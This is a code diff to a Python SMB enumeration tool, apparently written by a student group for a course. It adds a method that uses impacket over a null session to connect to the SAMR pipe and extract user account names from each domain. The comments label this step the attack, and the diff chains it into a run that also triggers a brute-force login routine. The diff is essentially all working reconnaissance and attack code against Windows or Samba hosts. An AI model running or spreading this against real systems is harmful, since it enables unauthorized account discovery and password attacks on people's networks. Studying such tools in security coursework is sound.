@@ -163,6 +163,89 @@ class SMBEnumerator:
 
         return self.shares
 
+    def enumerate_users_sid(self) -> List[str]:
+        """
+        Estudiante 2: Enumera usuarios utilizando técnicas de sondeo de SID (RID Cycling).
+        
+        Aprovecha la sesión nula para conectarse al pipe SAMR vía DCERPC y 
+        extraer los nombres de usuario asociados a los identificadores (RIDs).
+        
+        Returns:
+            List[str]: Lista de usuarios encontrados.
+        """
+        # Verificamos que exista la sesión nula
+        if not self.null_session_established:
+            print("  [!] (G2-E2) Se requiere sesión nula para el sondeo de SID.")
+            return self.users
+
+        print(f"[*] (G2-E2) Iniciando sondeo de SID (SAMR/DCERPC) en {self.ip_address}...")
+        
+        try:
+            # Importamos impacket localmente para no romper el script si el profesor no lo tiene
+            from impacket.dcerpc.v5 import transport, samr
+        except ImportError:
+            self.error_message = "Librería 'impacket' no instalada. Requerida para sondeo SID."
+            print(f"  [!] (G2-E2) {self.error_message}")
+            print("      Ejecute: pip install impacket")
+            return self.users
+
+        try:
+            # 1. Creamos el conducto (tubería) hacia la base de datos de seguridad (SAMR)
+            string_binding = fr'ncacn_np:{self.ip_address}[\pipe\samr]'
+            rpctransport = transport.DCERPCTransportFactory(string_binding)
+            rpctransport.set_credentials('', '', '', '', '') # Credenciales nulas
+            rpctransport.set_dport(self.port)
+            
+            # 2. Nos conectamos y enlazamos al servicio
+            dce = rpctransport.get_dce_rpc()
+            dce.connect()
+            dce.bind(samr.MSRPC_UUID_SAMR)
+            
+            # 3. Conectamos al servidor SAM
+            resp = samr.hSamrConnect(dce)
+            serverHandle = resp['ServerHandle']
+            
+            # 4. Obtenemos los dominios internos del servidor
+            resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
+            domains = resp['Buffer']['Buffer']
+            
+            for domain in domains:
+                domain_name = domain['Name']
+                
+                # Abrimos el dominio específico
+                resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, domain_name)
+                resp = samr.hSamrOpenDomain(dce, serverHandle=serverHandle, domainId=resp['DomainId'])
+                domainHandle = resp['DomainHandle']
+                
+                # 5. ¡El Ataque! Empezamos a sondear los usuarios (RID Probing)
+                status = samr.STATUS_MORE_ENTRIES
+                enumerationContext = 0
+                
+                while status == samr.STATUS_MORE_ENTRIES:
+                    try:
+                        resp = samr.hSamrEnumerateUsersInDomain(dce, domainHandle, enumerationContext=enumerationContext)
+                        for user in resp['Buffer']['Buffer']:
+                            username = user['Name']
+                            rid = user['RelativeId']
+                            
+                            if username not in self.users:
+                                self.users.append(username)
+                                print(f"  [+] (G2-E2) Usuario extraído (RID {rid}): {username}")
+                                
+                        enumerationContext = resp['EnumerationContext']
+                        status = resp['ErrorCode']
+                    except Exception as e:
+                        if str(e).find('STATUS_MORE_ENTRIES') >= 0:
+                            status = samr.STATUS_MORE_ENTRIES
+                        else:
+                            break
+                            
+        except Exception as e:
+            print(f"  [!] (G2-E2) Falló el sondeo SID: {str(e)}")
+            logging.debug(f"Error SID Probing: {e}")
+            
+        return self.users
+
     def close_connection(self) -> None:
         """
         Cierra la conexión SMB si está activa.
@@ -186,10 +269,10 @@ class SMBEnumerator:
             if self.establish_null_session():
                 print("[+] Sesión nula establecida con éxito.")
                 self.enumerate_shares()
+                self.enumerate_users_sid()  
             else:
                 print("[!] No se logró establecer sesión nula.")
 
-            # Si hay diccionarios cargados, ejecutamos el ataque de fuerza bruta (Estudiante 3)
             if self.users_to_test and self.passwords_to_test:
                 self.brute_force_login()
 
@@ -199,7 +282,7 @@ class SMBEnumerator:
         return {
             "modulo": "Enumeracion SMB",
             "grupo": 2,
-            "estudiante": "E1/E3",
+            "estudiante": "E1/E2/E3",        
             "target": self.ip_address,
             "timestamp": datetime.datetime.now().isoformat(),
             "status": "success",
